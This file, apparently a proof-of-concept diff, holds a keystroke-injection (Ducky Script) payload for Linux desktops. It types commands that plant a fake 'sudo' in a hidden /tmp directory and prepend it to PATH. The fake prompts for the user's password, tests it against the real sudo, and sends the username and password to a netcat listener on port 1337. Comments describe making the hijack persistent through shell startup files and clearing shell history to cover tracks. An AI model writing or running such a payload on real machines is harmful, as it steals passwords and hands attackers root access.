@@ -1,0 +1,79 @@
+DELAY 2000
+
+REM GUI space
+REM DELAY 500
+REM ALT F2
+REM DELAY 500
+REM BACKSPACE
+REM DELAY 100
+REM STRING terminal
+REM ENTER
+REM DELAY 3000
+
+STRING rm -rf /tmp/.config
+ENTER
+DELAY 100
+STRING mkdir -p /tmp/.config/sudo
+ENTER
+DELAY 100
+STRING echo '#!'$SHELL > /tmp/.config/sudo/sudo
+ENTER
+STRING echo '/usr/bin/sudo -n true 2>/dev/null' >> /tmp/.config/sudo/sudo
+ENTER
+STRING echo 'if [ $? -eq 0 ]' >> /tmp/.config/sudo/sudo
+ENTER
+STRING echo 'then' >> /tmp/.config/sudo/sudo
+ENTER
+STRING echo '/usr/bin/sudo $@' >> /tmp/.config/sudo/sudo
+ENTER
+STRING echo 'else' >> /tmp/.config/sudo/sudo
+ENTER
+STRING echo 'echo -n "[sudo] password for $USER: "' >> /tmp/.config/sudo/sudo
+ENTER
+STRING echo 'read -s pwd' >> /tmp/.config/sudo/sudo
+ENTER
+STRING echo 'echo' >> /tmp/.config/sudo/sudo
+ENTER
+STRING echo 'echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null' >> /tmp/.config/sudo/sudo
+ENTER
+STRING echo 'if [ $? -eq 1 ]' >> /tmp/.config/sudo/sudo
+ENTER
+STRING echo 'then' >> /tmp/.config/sudo/sudo
+ENTER
+STRING echo 'echo "$USER:$pwd:invalid" | nc -N localhost 1337' >> /tmp/.config/sudo/sudo
+ENTER
+STRING echo 'sudo $@' >> /tmp/.config/sudo/sudo
+ENTER
+STRING echo 'else' >> /tmp/.config/sudo/sudo
+ENTER
+STRING echo 'echo "$USER:$pwd:valid" | nc -N localhost 1337' >> /tmp/.config/sudo/sudo
+ENTER
+STRING echo 'echo "$pwd" | /usr/bin/sudo -S $@' >> /tmp/.config/sudo/sudo
+ENTER
+STRING echo 'fi' >> /tmp/.config/sudo/sudo
+ENTER
+STRING echo 'fi' >> /tmp/.config/sudo/sudo
+ENTER
+DELAY 100
+STRING chmod u+x /tmp/.config/sudo/sudo
+ENTER
+DELAY 100
+
+REM ********  Normally, we'd want to modify the user's PATH var for future terminal sessions
+REM ********  For a PoC, I'm only modifying the current session
+REM STRING echo "export PATH=/tmp/.config/sudo:$PATH" >> ~/.bash_profile
+REM STRING echo "export PATH=/tmp/.config/sudo:$PATH" >> ~/.bashrc
+
+STRING export PATH=/tmp/.config/sudo:$PATH
+ENTER
+DELAY 100
+ENTER
+DELAY 100
+
+REM ******** Clear history and screen
+REM STRING history -c && rm .bash_history && exit
+ENTER
+STRING clear
+ENTER
+DELAY 400
+REM GUI q
